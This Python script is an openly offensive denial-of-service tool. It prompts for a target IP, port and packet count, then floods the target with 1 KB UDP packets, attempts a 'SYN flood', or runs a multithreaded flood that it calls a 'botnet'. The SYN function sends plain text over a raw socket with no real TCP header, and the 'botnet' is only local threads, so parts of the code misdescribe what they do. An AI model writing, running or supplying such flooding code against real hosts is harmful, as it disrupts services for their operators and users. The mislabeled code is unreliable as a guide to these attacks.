import socket
import threading

def udp():
    # Get user inputs
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter number of packets to send: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1024  # 1KB packet
    for i in range(packet_count):
        sock.sendto(payload, (target_ip, target_port))
        print(f"[UDP] successfully sent {i + 1} to {target_ip}:{target_port}")
    print("UDP flood attack completed.")

def syn_flood():
    # Get user inputs
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter number of packets to send: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    payload = b"Fake SYN"
    for i in range(packet_count):
        sock.sendto(payload, (target_ip, target_port))
        print(f"[SYN Flood] successfully sent {i + 1} to {target_ip}:{target_port}")
    print("SYN flood attack completed.")

def botnet():
    # Get user inputs
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter number of packets to send: "))
    bots = int(input("Enter number of bots: "))

    def bot_task(bot_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * 1024  # 1KB packet
        for i in range(packet_count):
            sock.sendto(payload, (target_ip, target_port))
            print(f"[Botnet-Bot-{bot_id}] successfully sent {i + 1} to {target_ip}:{target_port}")

    threads = []
    for bot_id in range(1, bots + 1):
        thread = threading.Thread(target=bot_task, args=(bot_id,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    print("Botnet attack completed.")
    